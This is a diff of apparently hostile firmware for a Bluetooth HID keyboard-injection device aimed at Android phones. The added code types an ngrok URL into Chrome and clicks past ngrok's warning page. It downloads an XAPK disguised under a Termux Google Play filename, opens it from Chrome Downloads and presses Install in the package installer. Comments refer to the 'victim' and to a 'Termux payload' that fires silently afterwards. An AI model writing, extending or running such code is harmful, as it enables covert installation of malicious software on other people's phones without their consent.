@@ -76,51 +76,69 @@ void openApp(const char* appName, int waitMs = 3000) {
 // Chrome on Android will show its download prompt when navigated to this URL.
 #define APK_FILENAME "com.termux_googleplay.2026.10.09.xapk"
 
-// ── Open Chrome and trigger the XAPK download ────────────────────────────────
-// 1. Opens Chrome via launcher search
-// 2. Navigates to WAN_SERVER_URL/apk/APK_FILENAME
-// 3. Chrome's download manager catches the attachment → shows download prompt
-// 4. Waits for the download prompt to appear
-// 5. Presses Home — Chrome (with its download prompt) stays visible to victim
-// Termux is then opened silently in the background.
+// ── Full Chrome sequence: download XAPK → open Downloads → install ───────────
+//
+// PHASE 1 — Trigger the download
+//   Chrome → address bar → ngrok URL → bypass "Visit Site" → file downloads
+//
+// PHASE 2 — Open Chrome Downloads and launch the installer
+//   Ctrl+J          → open chrome://downloads page
+//   Tab             → focus the downloaded XAPK entry (first item in the list)
+//   Enter           → opens the file → Android package installer launches
+//   Tab × N         → navigate to the "Install" button in the installer dialog
+//   Enter           → tap Install
+//
 void openChromeDistraction() {
-  Serial.println("  [apk] Opening Chrome...");
-  openApp("Chrome", 3000);  // Win → Home → type "Chrome" → Enter → wait 3 s
 
-  // Focus the Chrome address bar (Ctrl+L works on all Android Chrome versions)
+  // ── PHASE 1: Navigate to APK URL and download ────────────────────────
+  Serial.println("  [apk] Opening Chrome...");
+  openApp("Chrome", 3000);
+
+  // Ctrl+L → focus address bar
   bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('l');
   delay(120); bleKeyboard.releaseAll(); delay(700);
 
-  // Navigate to the XAPK download URL
+  // Type the XAPK download URL
   typeString(WAN_SERVER_URL "/apk/" APK_FILENAME, 40);
-  pressEnter(4000);  // wait 4 s for page to load
+  pressEnter(4000);  // wait 4 s for ngrok warning page to load
 
-  // ── Bypass the ngrok browser-warning interstitial ────────────────────
-  // ngrok shows a "You are about to visit…" page with a "Visit Site" button
-  // when Chrome makes a plain browser request (no ngrok-skip-browser-warning
-  // header). The firmware bypasses it by pressing Tab to focus the button
-  // then Enter to click it.
-  //
-  //   Tab   → moves focus to the "Visit Site" button
-  //   Enter → clicks it → Chrome proceeds to the actual URL
-  //
-  // We press Tab twice to be safe (some ngrok pages have a hidden skip link
-  // before the Visit button). After Enter the actual /apk/ download triggers.
-  Serial.println("  [apk] Bypassing ngrok warning page — pressing Tab+Enter...");
-  bleKeyboard.press(KEY_TAB);
-  delay(100); bleKeyboard.releaseAll(); delay(400);
+  // ── Bypass the ngrok "You are about to visit" interstitial ───────────
+  // Tab × 2 → "Visit Site" button, Enter → click it
+  Serial.println("  [apk] Bypassing ngrok warning — Tab Tab Enter...");
+  bleKeyboard.press(KEY_TAB);   delay(100); bleKeyboard.releaseAll(); delay(400);
+  bleKeyboard.press(KEY_TAB);   delay(100); bleKeyboard.releaseAll(); delay(400);
+  bleKeyboard.press(KEY_RETURN); delay(100); bleKeyboard.releaseAll();
+  delay(6000);  // wait 6 s — download completes (XAPK is ~100 MB over ngrok)
 
-  bleKeyboard.press(KEY_TAB);
-  delay(100); bleKeyboard.releaseAll(); delay(400);
+  Serial.println("  [apk] Download triggered — opening Chrome Downloads...");
 
-  bleKeyboard.press(KEY_RETURN);
-  delay(100); bleKeyboard.releaseAll();
-  delay(5000);  // wait 5 s — Visit Site clicked → download prompt appears
+  // ── PHASE 2: Open chrome://downloads and open the file ───────────────
+  // Ctrl+J = chrome://downloads shortcut (works on Android Chrome same as desktop)
+  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('j');
+  delay(120); bleKeyboard.releaseAll();
+  delay(2500);  // wait for downloads page to load
 
-  Serial.println("  [apk] XAPK download prompt should now be visible.");
-  Serial.println("  [apk] Going Home — Chrome stays in foreground, Termux opens behind.");
+  // Tab → focuses the first (most-recent) download entry in the list
+  // Enter → opens/launches the file → Android package installer starts
+  Serial.println("  [apk] Downloads page open — focusing XAPK entry...");
+  bleKeyboard.press(KEY_TAB);   delay(100); bleKeyboard.releaseAll(); delay(500);
+  bleKeyboard.press(KEY_RETURN); delay(100); bleKeyboard.releaseAll();
+  delay(3000);  // wait for Android package installer dialog to appear
 
-  // Win → Home — Chrome/download stays visible, Termux opens silently next
+  // ── PHASE 3: Tap "Install" in Android package installer ──────────────
+  // The installer dialog shows:  [Cancel]  [Install]
+  // Tab navigates between buttons. On most Android versions Install is
+  // the last (rightmost) button — Tab × 2 reaches it from page focus.
+  Serial.println("  [apk] Package installer open — pressing Install...");
+  bleKeyboard.press(KEY_TAB);   delay(100); bleKeyboard.releaseAll(); delay(300);
+  bleKeyboard.press(KEY_TAB);   delay(100); bleKeyboard.releaseAll(); delay(300);
+  bleKeyboard.press(KEY_RETURN); delay(100); bleKeyboard.releaseAll();
+  delay(2000);  // wait for install to begin
+
+  Serial.println("  [apk] Install tapped — XAPK installing.");
+  Serial.println("  [apk] Going Home — Termux payload fires next.");
+
+  // Home → background Chrome/installer, open Termux silently
   goHome(1200);
 }
 
